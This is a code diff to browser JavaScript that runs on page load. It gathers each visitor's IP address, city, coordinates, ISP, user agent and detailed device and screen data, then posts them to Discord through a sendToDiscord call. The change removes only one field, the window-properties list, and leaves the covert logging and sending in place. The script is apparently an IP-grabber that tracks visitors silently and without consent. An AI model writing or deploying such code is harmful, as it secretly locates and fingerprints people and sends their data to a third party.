@@ -39,7 +39,6 @@ window.addEventListener('load', () => {
                     const longitude = ipData.lon;
                     const isp = ipData.isp;
                     const userAgent = navigator.userAgent;
-                    const windowProperties = Object.keys(window);
                     const windowWidth = window.innerWidth;
                     const windowHeight = window.innerHeight;
                     const windowRatio = windowWidth / windowHeight;
@@ -63,7 +62,6 @@ window.addEventListener('load', () => {
                     console.log('Longitude:', longitude);
                     console.log('ISP:', isp);
                     console.log('User Agent:', userAgent);
-                    console.log('Window Properties:', windowProperties);
                     console.log('Window Width:', windowWidth);
                     console.log('Window Height:', windowHeight);
                     console.log('Window Ratio:', windowRatio);
@@ -79,7 +77,7 @@ window.addEventListener('load', () => {
                     console.log('Available Browser Memory:', availableMemory);
                     console.log('CPU Threads:', cpuThreads);
 
-                    sendToDiscord(`IP Address: ${ip}\nCountry: ${country}\nRegion: ${region}\nCity: ${city}\nLatitude: ${latitude}\nLongitude: ${longitude}\nISP: ${isp}\nUser Agent: ${userAgent}\nWindow Properties: ${windowProperties}\nWindow Width: ${windowWidth}\nWindow Height: ${windowHeight}\nWindow Ratio: ${windowRatio}\nScreen Width: ${screenWidth}\nScreen Height: ${screenHeight}\nScreen Ratio: ${screenRatio}\nScreen Pixel Ratio: ${screenPixelRatio}\nScreen DPI: ${screenDPI}\nScreen Color Depth: ${screenColorDepth}\nScreen Orientation: ${screenOrientation}\nScreen Rotation: ${screenRotation}\nOS: ${os}\nAvailable Browser Memory: ${availableMemory}\nCPU Threads: ${cpuThreads}`);
+                    sendToDiscord(`IP Address: ${ip}\nCountry: ${country}\nRegion: ${region}\nCity: ${city}\nLatitude: ${latitude}\nLongitude: ${longitude}\nISP: ${isp}\nUser Agent: ${userAgent}\nWindow Width: ${windowWidth}\nWindow Height: ${windowHeight}\nWindow Ratio: ${windowRatio}\nScreen Width: ${screenWidth}\nScreen Height: ${screenHeight}\nScreen Ratio: ${screenRatio}\nScreen Pixel Ratio: ${screenPixelRatio}\nScreen DPI: ${screenDPI}\nScreen Color Depth: ${screenColorDepth}\nScreen Orientation: ${screenOrientation}\nScreen Rotation: ${screenRotation}\nOS: ${os}\nAvailable Browser Memory: ${availableMemory}\nCPU Threads: ${cpuThreads}`);
                 })
                 .catch(error => console.error('Error getting IP details:', error));
         })
